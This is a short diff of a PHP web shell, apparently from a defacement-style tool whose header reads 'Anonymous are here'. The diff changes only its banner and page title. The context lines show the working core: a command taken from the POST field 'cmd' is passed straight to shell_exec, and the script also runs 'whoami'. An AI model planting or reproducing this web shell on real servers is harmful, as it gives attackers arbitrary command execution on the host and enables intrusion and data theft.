@@ -1,6 +1,6 @@
 <?php
   $header1 = 'Anonymous are here';
-  $header2 = 'A simple command php shell';
+  $header2 = 'PHP web shell';
   $insert = $_POST['cmd'];
   $result = shell_exec($insert);
   $currentuser = shell_exec('whoami');
@@ -10,7 +10,7 @@
 <html>
   <head>
     <meta charset="utf-8">
-    <title>Base64 encoded shell</title>
+    <title>PHP web shell</title>
     <style media="screen">
     body {
       background-color: #000;
